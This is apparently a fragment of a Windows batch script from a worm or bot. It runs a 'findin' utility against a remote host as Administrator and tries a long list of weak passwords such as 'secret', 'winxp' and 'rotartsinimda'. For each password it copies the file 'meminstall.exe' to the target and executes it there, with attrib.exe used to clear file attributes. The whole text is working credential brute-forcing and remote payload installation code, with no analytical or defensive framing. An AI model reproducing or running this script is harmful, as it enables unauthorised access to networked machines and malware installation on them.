findin \\%1 -u Administrator -p "daffyduck" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "daffyduck" -d meminstall.exe -o
goto end
:Administrator-testing
findin \\%1 -u Administrator -p "testing" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "testing" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "testing" -d meminstall.exe -o
goto end
:Administrator-testtest
findin \\%1 -u Administrator -p "testtest" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "testtest" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "testtest" -d meminstall.exe -o
goto end
:Administrator-weed
findin \\%1 -u Administrator -p "weed" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "weed" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "weed" -d meminstall.exe -o
goto end
:Administrator-qwertyuiop[]
findin \\%1 -u Administrator -p "qwertyuiop[]" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "qwertyuiop[]" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "qwertyuiop[]" -d meminstall.exe -o
goto end
:Administrator-ohio
findin \\%1 -u Administrator -p "ohio" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "ohio" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "ohio" -d meminstall.exe -o
goto end
:Administrator-texas
findin \\%1 -u Administrator -p "texas" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "texas" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "texas" -d meminstall.exe -o
goto end
:Administrator-california
findin \\%1 -u Administrator -p "california" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "california" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "california" -d meminstall.exe -o
goto end
:Administrator-parsnip
findin \\%1 -u Administrator -p "parsnip" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "parsnip" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "parsnip" -d meminstall.exe -o
goto end
:Administrator-carrot
findin \\%1 -u Administrator -p "carrot" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "carrot" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "carrot" -d meminstall.exe -o
goto end
:Administrator-egg
findin \\%1 -u Administrator -p "egg" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "egg" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "egg" -d meminstall.exe -o
goto end
:Administrator-apple
findin \\%1 -u Administrator -p "apple" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "apple" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "apple" -d meminstall.exe -o
goto end
:Administrator-slut
findin \\%1 -u Administrator -p "slut" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "slut" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "slut" -d meminstall.exe -o
goto end
:Administrator-asdfghjkl
findin \\%1 -u Administrator -p "asdfghjkl" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "asdfghjkl" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "asdfghjkl" -d meminstall.exe -o
goto end
:Administrator-zxcvbnm
findin \\%1 -u Administrator -p "zxcvbnm" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "zxcvbnm" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "zxcvbnm" -d meminstall.exe -o
goto end
:Administrator-10987654321
findin \\%1 -u Administrator -p "10987654321" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "10987654321" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "10987654321" -d meminstall.exe -o
goto end
:Administrator-sweetspud
findin \\%1 -u Administrator -p "sweetspud" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "sweetspud" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "sweetspud" -d meminstall.exe -o
goto end
:Administrator-secret
findin \\%1 -u Administrator -p "secret" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "secret" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "secret" -d meminstall.exe -o
goto end
:Administrator-windowsnt
findin \\%1 -u Administrator -p "windowsnt" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "windowsnt" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "windowsnt" -d meminstall.exe -o
goto end
:Administrator-winnt
findin \\%1 -u Administrator -p "winnt" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "winnt" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "winnt" -d meminstall.exe -o
goto end
:Administrator-win2k
findin \\%1 -u Administrator -p "win2k" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "win2k" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "win2k" -d meminstall.exe -o
goto end
:Administrator-win2000
findin \\%1 -u Administrator -p "win2000" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "win2000" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "win2000" -d meminstall.exe -o
goto end
:Administrator-win98
findin \\%1 -u Administrator -p "win98" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "win98" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "win98" -d meminstall.exe -o
goto end
:Administrator-win95
findin \\%1 -u Administrator -p "win95" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "win95" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "win95" -d meminstall.exe -o
goto end
:Administrator-winxp
findin \\%1 -u Administrator -p "winxp" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "winxp" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "winxp" -d meminstall.exe -o
goto end
:Administrator-windowsxp
findin \\%1 -u Administrator -p "windowsxp" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "windowsxp" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "windowsxp" -d meminstall.exe -o
goto end
:Administrator-windows2000
findin \\%1 -u Administrator -p "windows2000" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "windows2000" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "windows2000" -d meminstall.exe -o
goto end
:Administrator-rotartsinimda
findin \\%1 -u Administrator -p "rotartsinimda" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "rotartsinimda" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "rotartsinimda" -d meminstall.exe -o
goto end
:end
